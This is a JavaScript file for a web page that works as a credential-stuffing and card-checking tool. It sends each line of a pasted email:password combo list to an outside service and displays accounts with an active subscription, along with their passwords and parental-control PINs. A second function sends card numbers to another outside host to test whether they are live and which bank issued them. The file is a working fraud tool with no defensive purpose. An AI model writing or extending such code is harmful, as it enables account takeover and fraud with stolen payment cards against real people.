
document.addEventListener('DOMContentLoaded', function () {
    var checkBtn = document.getElementById("checkBtn");
    checkBtn.addEventListener('click', async function () {
        const comboList = document.getElementById('comboList').value;
        const credentials = comboList.split('\n');
        const hitsOutput = document.getElementById('hitsOutputs');
        hitsOutput.innerHTML = '';

        try {
            const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
            const responses = await Promise.all(requests);

            let hitCount = 0;
            responses.forEach(response => {
                // console.log(response.data, response.data?.subscriptionStatus.toUpperCase());
                if (response.data?.subscriptionStatus.toUpperCase() === 'ACTIVE') {
                    hitCount++;
                    hitsOutput.innerHTML += `
                        <div class="card mx-auto">
                            <div class="card-body text-center">
                                ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
                            </div>
                        </div>
                    `
                }
            });

            if (hitCount === 0) {
                hitsOutput.innerHTML = 'No active subscriptions found.';
            }
        } catch (error) {
            console.error(error);
            hitsOutput.innerHTML = 'An error occurred while checking the credentials.';
        }
    });
});

function isLive(kardo) {
    return axios.get(`https://cc-fordward.onrender.com/check?cc=${kardo}`).then((res) => {
        return { bankNAme: res.data.bankName, status: res.data.status };
    })
}

function showToast(checkDigit) {
    const toast = document.getElementById('toast');
    toast.style.display = 'block';
    toast.style.opacity = 1;
    toast.style.bottom = '40px';
    toast.style.zIndex = 9999;
    toast.textContent = "Copied to clipboard! " + checkDigit;

    setTimeout(() => {
        toast.style.opacity = 0;
        toast.style.bottom = '20px';
        setTimeout(() => {
            toast.style.display = 'none';
        }, 500);
    }, 2000);
}

function copyToClipboard(bin) {
    let copyBin = bin.split('|')[0];
    navigator.clipboard.writeText(copyBin).then(() => {
        showToast(copyBin);
    }).catch(err => {
        console.error('Error in copying text: ', err);
    });
}
